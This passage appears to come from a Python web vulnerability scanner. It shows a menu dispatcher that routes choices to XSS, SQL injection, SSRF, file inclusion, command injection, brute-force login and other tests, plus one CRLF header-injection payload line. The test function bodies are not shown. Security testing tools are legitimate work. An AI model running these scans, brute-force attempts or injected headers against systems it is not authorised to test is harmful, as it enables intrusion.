                    "%0aX-Test: injected-header"
                ]
            elif choice == 14:
                payloads = xpath_payloads  # Use the expanded payload list for XPath Injection

    if choice == 1:
        crawl_for_forms(target_url)
    elif choice == 2:
        xss_test(target_url, payloads)
    elif choice == 3:
        sql_injection_test(target_url, payloads)
    elif choice == 4:
        ssrf_test(target_url, payloads)
    elif choice == 5:
        rfi_test(target_url, payloads)
    elif choice == 6:
        lfi_test(target_url, payloads)
    elif choice == 7:
        command_injection_test(target_url, payloads)
    elif choice == 8:
        header_injection_test(target_url, payloads)
    elif choice == 9:
        username = input("Enter username for brute force/login (if applicable): ")
        wordlist = input("Enter wordlist file path (if applicable): ")
        brute_force_test(target_url, username, wordlist)
    elif choice == 10:
        username = input("Enter username for login: ")
        password = input("Enter password for login: ")
        session = login(target_url, username, password)
        if session:
            log_result("Session Handling", "Info", f"Logged in with {username}", target_url, "password")
    elif choice == 11:
        method = input("Enter the HTTP method (GET or POST): ").upper()
        data_input = input("Enter the data to send (key=value pairs, separated by commas): ")
        data = dict(item.split('=') for item in data_input.split(','))
        api_test(target_url, method, data)
    elif choice == 12:
        generate_report_chart()
    elif choice == 13:
        sql_injection_blind_test(target_url, payloads)
    elif choice == 14:
        xpath_injection_test(target_url, payloads)
    elif choice == 15:
        formula_injection_test(target_url, payloads)
    elif choice == 16:
        php_object_injection_test(target_url, payloads)
    elif choice == 17:
        file_uploads_test(target_url)
    elif choice == 18:
        dom_xss_test(target_url, payloads)
    elif choice == 19:
        session_issues_test(target_url)
    elif choice == 20:
        idor_test(target_url, payloads)
    elif choice == 21:
        missing_functional_access_control_test(target_url)
    elif choice == 22:
        csrf_test(target_url)
    elif choice == 23:
        cryptography_test(target_url)
    elif choice == 24:
        unvalidated_redirect_test(target_url, payloads)
    elif choice == 25:
        ssti_test(target_url, payloads)
    elif choice == 26:
        print("Exiting...")
        exit()

# Main function to run the menu-driven program
def main():
    while True:
        display_menu()
        try:
            choice = int(input("Enter your choice: "))
            handle_menu_choice(choice)
        except ValueError:
            print("Invalid input. Please enter a number between 1 and 26.")

if __name__ == "__main__":
    main()
